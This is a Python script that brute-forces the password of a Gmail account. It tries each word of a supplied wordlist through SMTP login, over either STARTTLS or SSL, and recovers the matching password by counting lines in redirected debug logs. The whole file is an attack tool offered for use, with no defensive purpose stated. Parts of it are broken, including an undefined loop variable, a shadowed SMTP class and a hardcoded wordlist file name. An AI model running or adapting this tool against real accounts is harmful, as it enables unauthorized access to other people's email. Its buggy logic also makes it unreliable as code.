#!/usr/bin/python3
# -*- coding: utf-8 -*-

from smtplib import SMTP
from smtplib import SMTP_SSL
from smtplib import SMTPAuthenticationError
import string
import sys # redirect stdout & stderr to a log file
import re # search pattern

def trial_without_ssl(mail_user, mail_pass): 
    print("[+] trial_without_ssl function is running...")
    SMTP = SMTP("smtp.google.com", 587)
    SMTP.set_debuglevel(2)
    SMTP.ehlo()
    SMTP.starttls()
    
    # doesnt have to manually close file
    with open(mail_pass, 'r') as f:
        file_contents = f.read()
    
    words = file_contents.split(' ')
     
    for password in opf:
        try:
            SMTP.login(mail_user, password)
            print("Founded with easyway")
            print("password for "+ mail_user + " is " + password)
            return True
        except SMTPAuthenticationError:
            print(" Username and " + password + " not accepted.")
    SMTP.close()

def trial_with_ssl(mail_user, mail_pass):
    index_of_pass = 0
    count_err = 0
    count_pss = 1
    
    print("[+] trial_with_ssl function is running...")
    server_ssl = SMTP_SSL("smtp.gmail.com", 465)
    server_ssl.set_debuglevel(2)
    server_ssl.ehlo()  # optional, called by login()

    #### doesnt have to manually close file #######################
    with open(mail_pass, 'r') as f:
        file_contents = f.read()
        
    words = file_contents.split(' ')
    
    sys.stdout = open('ssl_dbg_out', 'w')    
    sys.stderr = open('ssl_dbg_err', 'w')

    for password in words:
        try:
            server_ssl.login(mail_user, password)
            print("Founded with easyway")
            print("password for " + mail_user + " is " + password)
        except SMTPAuthenticationError:
            print(password)
            
    server_ssl.close()
    
    sys.stdout.close()  # close ssl_dbg_out
    sys.stderr.close()  # close ssl_dbg_err
    
    sys.stdout = sys.__stdout__
    sys.stderr = sys.__stderr__
    
    ####              differences between                 #####
    ####          pieces of error in debug log            #####
    ####            and pieces of passwords               #####
    with open('ssl_dbg_err') as f:
        for line in f:
            count_err += line.count("Username")
        
    with open('passwfile') as f:
        for line in f:
            count_pss += line.count(" ")
    
    count_pss *= 4
    if count_err >= count_pss:
        print("Pass Not Found") 
    elif count_err < count_pss:
        print("Founded with hardway")   
    else:
        print("-*-")
        
    # 1 False Password = 11 line of err
    # 1st line of specific - 2 = false passwords
    # if 1st line of specific - 2 <= 0 
    # password is 1st pass
    # password is (false passwords + 1)st pass
    
    specifics = []
    linenum = 0
    pattern = re.compile("specific", re.IGNORECASE) # Compile a case-insensitive regex
    with open ('ssl_dbg_err', 'rt') as myfile:    
        for line in myfile:
            linenum += 1
            if pattern.search(line) != None: # If a match is found 
                specifics.append((linenum, line.rstrip('\n')))
    for err in specifics: # Iterate over the list of tuples
        index_of_pass = err[0]
        index_of_pass /= 11
        break
    
    index_of_pass = int(index_of_pass)              # list indices must be integers
                                                    # or slices, not float
        
    passlines = []                                  # Declare an empty list.
    with open ('ssl_dbg_out', 'rt') as myfile:      # Open lorem.txt for reading text.
        for passline in myfile:                     # For each line in the file,
            passlines.append(passline.rstrip('\n')) # strip newline and add to list.
    
    print(passlines[index_of_pass])
        
# ----------------------------------------------------------------------------------- #
#                                 MAIN FUNCTION                                       #
# ----------------------------------------------------------------------------------- #

def main():
    print("TLS protocol is not working !!!")
    print("Type 'ssl' for the protocol.")
    mail_user = str(input("E-mail: "))
    mail_pass = str(input("Wordlist: "))
    
    mail_ssl = "ssl"
    mail_ssl = str(input("Protocol: "))
    
    if mail_ssl == "ssl":
        trial_with_ssl(mail_user, mail_pass)
    elif mail_ssl == "tls":
        trial_without_ssl(mail_user, mail_pass)
          
if __name__ == "__main__":
  main()
